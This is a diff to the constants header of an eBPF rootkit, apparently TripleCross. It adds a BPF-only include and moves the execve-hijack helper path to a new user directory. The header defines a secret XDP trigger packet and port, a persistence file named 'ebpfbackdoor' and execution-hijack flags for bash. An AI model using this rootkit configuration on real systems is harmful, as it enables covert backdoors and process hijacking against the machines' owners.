@@ -1,6 +1,8 @@
 #ifndef __CONSTANTS_H
 #define __CONSTANTS_H
-
+#ifdef __BPF__  // 只有 clang 编译 eBPF 时才会定义这个宏
+#include "headervmlinux.h"
+#endif
 //XDP
 #define SECRET_PACKET_PAYLOAD "XDP_PoC_0"
 #define SECRET_PACKET_DEST_PORT 9000
@@ -22,7 +24,8 @@
 #define SECRET_FILE_PERSISTENCE_NAME "ebpfbackdoor"
 
 //EXECUTION HIJACKING
-#define PATH_EXECUTION_HIJACK_PROGRAM "/home/osboxes/TFG/src/helpers/execve_hijack\0"
+//#define PATH_EXECUTION_HIJACK_PROGRAM "/home/osboxes/TFG/src/helpers/execve_hijack\0"
+#define PATH_EXECUTION_HIJACK_PROGRAM "/home/u22/myebpf/TripleCross/src/helpers/execve_hijack\0"
 #define EXEC_HIJACK_ACTIVE 0 //0 Deactivated, 1 active
 #define TASK_COMM_NAME_RESTRICT_HIJACK "bash"
 #define TASK_COMM_RESTRICT_HIJACK_ACTIVE 1
